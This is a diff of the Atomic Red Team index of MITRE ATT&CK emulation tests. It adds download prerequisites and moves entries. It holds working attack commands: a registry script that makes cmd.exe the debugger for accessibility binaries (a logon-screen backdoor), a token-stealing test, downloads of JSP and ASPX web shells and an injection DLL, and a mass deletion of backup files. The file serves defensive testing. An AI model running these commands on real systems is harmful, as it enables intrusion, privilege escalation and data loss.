+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -11973,7 +12494,7 @@ defense-evasion:
           default: "/opt/filename"
       executor:
         name: sh
-        command: 'touch -acmr #{reference_file_path} {target_file_path}
+        command: 'touch -acmr #{reference_file_path} #{target_file_path}
 
 '
     - name: Windows - Modify file creation timestamp with PowerShell
@@ -12185,6 +12706,13 @@ defense-evasion:
           description: Location of the project file
           type: Path
           default: PathToAtomicsFolder\T1127\src\T1127.csproj
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Project file must exist on disk at specified location (#{filename})
+        prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/T1127.csproj" -OutFile "#{filename}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -12267,7 +12795,7 @@ defense-evasion:
           %TEMP%\bitsadmindownload.html
 
 '
-        cleanup_command: 'del %TEMP%\bitsadmindownload.html
+        cleanup_command: 'del %TEMP%\bitsadmindownload.html >nul 2>&1
 
 '
     - name: Reach out to C2 Pointer URLs via powershell
@@ -12392,6 +12920,18 @@ defense-evasion:
           description: Location of the test XSL script file on the local filesystem.
           type: Path
           default: PathToAtomicsFolder\T1220\src\msxslscript.xsl
+      dependency_executor_name: powershell
+      dependencies:
+      - description: XML file must exist on disk at specified location (#{xmlfile})
+        prereq_command: 'if (Test-Path #{xmlfile}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
+      - description: XSL file must exist on disk at specified location (#{xslfile})
+        prereq_command: 'if (Test-Path #{xslfile}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -12435,6 +12975,13 @@ defense-evasion:
           description: Location of the test XSL script file on the local filesystem.
           type: path
           default: PathToAtomicsFolder\T1220\src\wmicscript.xsl
+      dependency_executor_name: powershell
+      dependencies:
+      - description: XSL file must exist on disk at specified location (#{local_xsl_file})
+        prereq_command: 'if (Test-Path #{local_xsl_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
       executor:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
@@ -12462,272 +13009,6 @@ defense-evasion:
 
 '
 privilege-escalation:
-  T1134:
-    technique:
-      x_mitre_permissions_required:
-      - User
-      - Administrator
-      x_mitre_data_sources:
-      - API monitoring
-      - Access tokens
-      - Process monitoring
-      - Process command-line parameters
-      name: Access Token Manipulation
-      description: "Windows uses access tokens to determine the ownership of a running
-        process. A user can manipulate access tokens to make a running process appear
-        as though it belongs to someone other than the user that started the process.
-        When this occurs, the process also takes on the security context associated
-        with the new token. For example, Microsoft promotes the use of access tokens
-        as a security best practice. Administrators should log in as a standard user
-        but run their tools with administrator privileges using the built-in access
-        token manipulation command <code>runas</code>.(Citation: Microsoft runas)\n
-        \ \nAdversaries may use access tokens to operate under a different user or
-        system security context to perform actions and evade detection. An adversary
-        can use built-in Windows API functions to copy access tokens from existing
-        processes; this is known as token stealing. An adversary must already be in
-        a privileged user context (i.e. administrator) to steal a token. However,
-        adversaries commonly use token stealing to elevate their security context
-        from the administrator level to the SYSTEM level. An adversary can use a token
-        to authenticate to a remote system as the account for that token if the account
-        has appropriate permissions on the remote system.(Citation: Pentestlab Token
-        Manipulation)\n\nAccess tokens can be leveraged by adversaries through three
-        methods:(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\n**Token
-        Impersonation/Theft** - An adversary creates a new access token that duplicates
-        an existing token using <code>DuplicateToken(Ex)</code>. The token can then
-        be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread
-        to impersonate a logged on user's security context, or with <code>SetThreadToken</code>
-        to assign the impersonated token to a thread. This is useful for when the
-        target user has a non-network logon session on the system.\n\n**Create Process
-        with a Token** - An adversary creates a new access token with <code>DuplicateToken(Ex)</code>
-        and uses it with <code>CreateProcessWithTokenW</code> to create a new process
-        running under the security context of the impersonated user. This is useful
-        for creating a new process under the security context of a different user.\n\n**Make
-        and Impersonate Token** - An adversary has a username and password but the
-        user is not logged onto the system. The adversary can then create a logon
-        session for the user using the <code>LogonUser</code> function. The function
-        will return a copy of the new session's access token and the adversary can
-        use <code>SetThreadToken</code> to assign the token to a thread.\n\nAny standard
-        user can use the <code>runas</code> command, and the Windows API functions,
-        to create impersonation tokens; it does not require access to an administrator
-        account.\n\nMetasploit’s Meterpreter payload allows arbitrary token manipulation
-        and uses token impersonation to escalate privileges.(Citation: Metasploit
-        access token) The Cobalt Strike beacon payload allows arbitrary token impersonation
-        and can also create tokens. (Citation: Cobalt Strike Access Token)"
-      id: attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48
-      x_mitre_platforms:
-      - Windows
-      object_marking_refs:
-      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
-      x_mitre_version: '1.0'
-      type: attack-pattern
-      x_mitre_detection: "If an adversary is using a standard command-line shell,
-        analysts can detect token manipulation by auditing command-line activity.
-        Specifically, analysts should look for use of the <code>runas</code> command.
-        Detailed command-line logging is not enabled by default in Windows.(Citation:
-        Microsoft Command-line Logging)\n\nIf an adversary is using a payload that
-        calls the Windows token APIs directly, analysts can detect token manipulation
-        only through careful analysis of user network activity, examination of running
-        processes, and correlation with other endpoint and network behavior. \n\nThere
-        are many Windows API calls a payload can take advantage of to manipulate access
-        tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>(Citation:
-        Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation:
-        Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API
-        pages for more information.\n\nQuery systems for process and thread token
-        information and look for inconsistencies such as user owns processes impersonating
-        the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)"
-      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      x_mitre_contributors:
-      - Tom Ueltschi @c_APT_ure
-      - Travis Smith, Tripwire
-      - Robby Winchester, @robwinchester3
-      - Jared Atkinson, @jaredcatkinson
-      created: '2017-12-14T16:46:06.044Z'
-      x_mitre_effective_permissions:
-      - SYSTEM
-      kill_chain_phases:
-      - kill_chain_name: mitre-attack
-        phase_name: defense-evasion
-      - kill_chain_name: mitre-attack
-        phase_name: privilege-escalation
-      external_references:
-      - external_id: T1134
-        source_name: mitre-attack
-        url: https://attack.mitre.org/techniques/T1134
-      - source_name: capec
-        external_id: CAPEC-633
-        url: https://capec.mitre.org/data/definitions/633.html
-      - source_name: Microsoft runas
-        description: Microsoft TechNet. (n.d.). Runas. Retrieved April 21, 2017.
-        url: https://technet.microsoft.com/en-us/library/bb490994.aspx
-      - source_name: Pentestlab Token Manipulation
-        description: netbiosX. (2017, April 3). Token Manipulation. Retrieved April
-          21, 2017.
-        url: https://pentestlab.blog/2017/04/03/token-manipulation/
-      - source_name: BlackHat Atkinson Winchester Token Manipulation
-        description: 'Atkinson, J., Winchester, R. (2017, December 7). A Process is
-          No One: Hunting for Token Manipulation. Retrieved December 21, 2017.'
-        url: https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf
-      - source_name: Metasploit access token
-        description: Offensive Security. (n.d.). What is Incognito. Retrieved April
-          21, 2017.
-        url: https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
-      - source_name: Cobalt Strike Access Token
-        description: Mudge, R. (n.d.). Windows Access Tokens and Alternate Credentials.
-          Retrieved April 21, 2017.
-        url: https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/
-      - source_name: Microsoft Command-line Logging
-        description: Mathers, B. (2017, March 7). Command line process auditing. Retrieved
-          April 21, 2017.
-        url: https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing
-      - source_name: Microsoft LogonUser
-        description: Microsoft TechNet. (n.d.). Retrieved April 25, 2017.
-        url: https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx
-      - source_name: Microsoft DuplicateTokenEx
-        description: Microsoft TechNet. (n.d.). Retrieved April 25, 2017.
-        url: https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx
-      - source_name: Microsoft ImpersonateLoggedOnUser
-        description: Microsoft TechNet. (n.d.). Retrieved April 25, 2017.
-        url: https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx
-      modified: '2019-10-14T20:45:04.451Z'
-      identifier: T1134
-    atomic_tests:
-    - name: Access Token Manipulation
-      description: |
-        Creates a process as another user
-        Requires Administrator Privileges To Execute Test
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_user:
-          description: Username To Steal Token From
-          type: String
-          default: SYSTEM
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          #list processes by user,
-          $owners = @{}
-          gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
-          get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
-
-          #Steal Token
-          Set-Location $PathToAtomicsFolder
-          .\T1134\src\T1134.ps1
-  T1015:
-    technique:
-      x_mitre_permissions_required:
-      - Administrator
-      x_mitre_data_sources:
-      - Windows Registry
-      - File monitoring
-      - Process monitoring
-      name: Accessibility Features
-      description: |-
-        Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.
-
-        Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)
-
-        Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:
-
-        For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)
-
-        For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for the accessibility program (e.g., "utilman.exe"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)
-
-        Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)
-
-        * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
-        * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
-        * Narrator: <code>C:\Windows\System32\Narrator.exe</code>
-        * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
-        * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>
-      id: attack-pattern--9b99b83a-1aac-4e29-b975-b374950551a3
-      x_mitre_platforms:
-      - Windows
-      object_marking_refs:
-      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
-      x_mitre_version: '1.0'
-      type: attack-pattern
-      x_mitre_detection: Changes to accessibility utility binaries or binary paths
-        that do not correlate with known software, patch cycles, etc., are suspicious.
-        Command line invocation of tools capable of modifying the Registry for associated
-        keys are also suspicious. Utility arguments and the binaries themselves should
-        be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-        NT\CurrentVersion\Image File Execution Options</code>.
-      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      x_mitre_contributors:
-      - Paul Speulstra, AECOM Global Security Operations Center
-      created: '2017-05-31T21:30:26.946Z'
-      x_mitre_effective_permissions:
-      - SYSTEM
-      kill_chain_phases:
-      - kill_chain_name: mitre-attack
-        phase_name: persistence
-      - kill_chain_name: mitre-attack
-        phase_name: privilege-escalation
-      external_references:
-      - external_id: T1015
-        source_name: mitre-attack
-        url: https://attack.mitre.org/techniques/T1015
-      - source_name: capec
-        external_id: CAPEC-558
-        url: https://capec.mitre.org/data/definitions/558.html
-      - source_name: FireEye Hikit Rootkit
-        description: 'Glyer, C., Kazanciyan, R. (2012, August 20). THE “HIKIT” ROOTKIT:
-          ADVANCED AND PERSISTENT ATTACK TECHNIQUES (PART 1). Retrieved June 6, 2016.'
-        url: https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html
-      - source_name: DEFCON2016 Sticky Keys
-        description: Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to
-          the Kingdom. Retrieved July 5, 2017.
-        url: https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom
-      - source_name: Tilbury 2014
-        description: Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse.
-          Retrieved November 12, 2014.
-        url: http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/
-      modified: '2019-07-16T19:07:04.652Z'
-      identifier: T1015
-    atomic_tests:
-    - name: Attaches Command Prompt as a Debugger to a List of Target Processes
-      description: 'Attaches cmd.exe to a list of processes. Configure your own Input
-        arguments to a different executable or list of executables.
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        parent_list:
-          description: 'Comma separated list of system binaries to which you want
-            to attach each #{attached_process}. Default: "osk.exe"
-
-'
-          type: String
-          default: osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe,
-            atbroker.exe
-        attached_process:
-          description: 'Full path to process to attach to target in #{parent_list}.
-            Default: cmd.exe
-
-'
-          type: Path
-          default: C:\windows\system32\cmd.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value
-          = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item
-          = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows
-          NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path
-          $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty
-          -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n
-          \ }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value
-          $Value\n  }\n}\n"
-        cleanup_command: |-
-          $input_table = "#{parent_list}".split(",")
-          Foreach ($item in $input_table)
-          {
-            $item = $item.trim()
-            reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f
-          }
   '':
     technique:
       x_mitre_data_sources:
@@ -12851,6 +13132,120 @@ privilege-escalation:
       - System access controls
       - Anti-virus
     atomic_tests: []
+  T1015:
+    technique:
+      x_mitre_permissions_required:
+      - Administrator
+      x_mitre_data_sources:
+      - Windows Registry
+      - File monitoring
+      - Process monitoring
+      name: Accessibility Features
+      description: |-
+        Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.
+
+        Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)
+
+        Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:
+
+        For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)
+
+        For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for the accessibility program (e.g., "utilman.exe"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)
+
+        Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)
+
+        * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
+        * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
+        * Narrator: <code>C:\Windows\System32\Narrator.exe</code>
+        * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
+        * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>
+      id: attack-pattern--9b99b83a-1aac-4e29-b975-b374950551a3
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: Changes to accessibility utility binaries or binary paths
+        that do not correlate with known software, patch cycles, etc., are suspicious.
+        Command line invocation of tools capable of modifying the Registry for associated
+        keys are also suspicious. Utility arguments and the binaries themselves should
+        be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+        NT\CurrentVersion\Image File Execution Options</code>.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Paul Speulstra, AECOM Global Security Operations Center
+      created: '2017-05-31T21:30:26.946Z'
+      x_mitre_effective_permissions:
+      - SYSTEM
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - external_id: T1015
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1015
+      - source_name: capec
+        external_id: CAPEC-558
+        url: https://capec.mitre.org/data/definitions/558.html
+      - source_name: FireEye Hikit Rootkit
+        description: 'Glyer, C., Kazanciyan, R. (2012, August 20). THE “HIKIT” ROOTKIT:
+          ADVANCED AND PERSISTENT ATTACK TECHNIQUES (PART 1). Retrieved June 6, 2016.'
+        url: https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html
+      - source_name: DEFCON2016 Sticky Keys
+        description: Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to
+          the Kingdom. Retrieved July 5, 2017.
+        url: https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom
+      - source_name: Tilbury 2014
+        description: Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse.
+          Retrieved November 12, 2014.
+        url: http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/
+      modified: '2019-07-16T19:07:04.652Z'
+      identifier: T1015
+    atomic_tests:
+    - name: Attaches Command Prompt as a Debugger to a List of Target Processes
+      description: 'Attaches cmd.exe to a list of processes. Configure your own Input
+        arguments to a different executable or list of executables.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_list:
+          description: 'Comma separated list of system binaries to which you want
+            to attach each #{attached_process}. Default: "osk.exe"
+
+'
+          type: String
+          default: osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe,
+            atbroker.exe
+        attached_process:
+          description: 'Full path to process to attach to target in #{parent_list}.
+            Default: cmd.exe
+
+'
+          type: Path
+          default: C:\windows\system32\cmd.exe
+      executor:
+        name: powershell
+        elevation_required: true
+        command: "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value
+          = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item
+          = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows
+          NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path
+          $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty
+          -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n
+          \ }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value
+          $Value\n  }\n}\n"
+        cleanup_command: |-
+          $input_table = "#{parent_list}".split(",")
+          Foreach ($item in $input_table)
+          {
+            $item = $item.trim()
+            reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f
+          }
   T1103:
     technique:
       x_mitre_data_sources:
@@ -13028,6 +13423,13 @@ privilege-escalation:
           description: Path to the shim databaase file
           type: String
           default: PathToAtomicsFolder\T1138\src\AtomicShimx86.sdb
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Shim database file must exist on disk at specified location (#{file_path})
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1138/src/AtomicShimx86.sdb" -OutFile "#{file_path}"
       executor:
         name: command_prompt
         elevation_required: true
@@ -13412,8 +13814,8 @@ privilege-escalation:
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
           %APPDATA%\updater.exe -Command exit
         cleanup_command: |
-          del %APPDATA%\updater.exe
-          del %APPDATA%\amsi.dll
+          del %APPDATA%\updater.exe >nul 2>&1
+          del %APPDATA%\amsi.dll >nul 2>&1
   T1519:
     technique:
       x_mitre_permissions_required:
@@ -13711,6 +14113,13 @@ privilege-escalation:
           description: TLS Server To Test Get Request
           type: Url
           default: https://www.example.com
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1179x64.dll must exist on disk at specified location (#{file_name})
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1179/bin/T1179x64.dll" -OutFile "#{file_name}"
       executor:
         name: powershell
         elevation_required: true
@@ -14034,6 +14443,13 @@ privilege-escalation:
           description: Name of the Service
           type: String
           default: AtomicTestService
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Service binary must exist on disk at specified location (#{binary_path})
+        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
         name: command_prompt
         elevation_required: true
@@ -14058,6 +14474,13 @@ privilege-escalation:
           description: Name of the Service
           type: String
           default: AtomicTestService
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Service binary must exist on disk at specified location (#{binary_path})
+        prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
         name: powershell
         elevation_required: true
@@ -14157,7 +14580,7 @@ privilege-escalation:
         dll_path:
           description: Path of the dll to inject
           type: string
-          default: "$PathToAtomicsFolder\\T1502\\bin\\calc.dll"
+          default: PathToAtomicsFolder\T1502\bin\calc.dll
         dll_process_name:
           description: Name of the created process from the injected dll
           type: string
@@ -14170,6 +14593,13 @@ privilege-escalation:
           description: Name of the process to spawn
           type: string
           default: iexplore
+      dependency_executor_name: powershell
+      dependencies:
+      - description: DLL to inject must exist on disk at specified location (#{dll_path})
+        prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1502/bin/calc.dll" -OutFile "#{dll_path}"
       executor:
         name: powershell
         elevation_required: false
@@ -14525,8 +14955,15 @@ privilege-escalation:
           default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
         process_id:
           description: PID of input_arguments
-          type: Int
+          type: Integer
           default: "(get-process spoolsv).id"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Utility to inject must exist on disk at specified location (#{dll_payload})
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
       executor:
         name: powershell
         elevation_required: true
@@ -14546,7 +14983,7 @@ privilege-escalation:
           default: T1055.dll
         process_id:
           description: PID of input_arguments
-          type: Int
+          type: Integer
           default: "(get-process spoolsv).id"
       executor:
         name: powershell
@@ -14624,8 +15061,8 @@ privilege-escalation:
           copy C:\Windows\System32\cmd.exe C:\svchost.exe
           C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt
         cleanup_command: |
-          del C:\T1055.txt
-          del C:\svchost.exe
+          del C:\T1055.txt >nul 2>&1
+          del C:\svchost.exe >nul 2>&1
   T1053:
     technique:
       x_mitre_permissions_required:
@@ -14886,7 +15323,7 @@ privilege-escalation:
       input_arguments:
         weak_service_name:
           description: weak service check
-          type: Registry
+          type: String
           default: weakservicename
       executor:
         name: powershell
@@ -15316,12 +15753,21 @@ privilege-escalation:
           description: Path of Web Shell
           type: path
           default: PathToAtomicsFolder\T1100\src\
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Web shell must exist on disk at specified location (#{web_shells})
+        prereq_command: 'if (Test-Path #{web_shells}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/tests.jsp" -OutFile "#{web_shells}/test.jsp"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
       executor:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
 
 '
-        cleanup_command: 'del #{web_shell_path}
+        cleanup_command: 'del #{web_shell_path} >nul 2>&1
 
 '
 impact:
@@ -15606,7 +16052,7 @@ impact:
         name: command_prompt
         elevation_required: true
         command: 'del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
-          c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+          c:\backup*.* c:\*.set c:\*.win c:\*.dsk >nul 2>&1
 
 '
   '':
@@ -16472,10 +16918,6 @@ discovery:
       supported_platforms:
       - windows
       input_arguments:
-        input_url:
-          description: URL to source code in Atomic-Red-Team git repository
-          type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs
         input_source_code:
           description: Path to source of C# code
           type: path
@@ -16488,7 +16930,9 @@ discovery:
       dependencies:
       - description: T1010.cs must exist on disk at specified location (#{input_source_code})
         prereq_command: 'if (Test-Path #{input_source_code}) {exit 0} else {exit 1}'
-        get_prereq_command: Invoke-WebRequest "#{input_URL}" -OutFile "#{input_source_code}"
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{input_source_code}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "#{input_source_code}"
       executor:
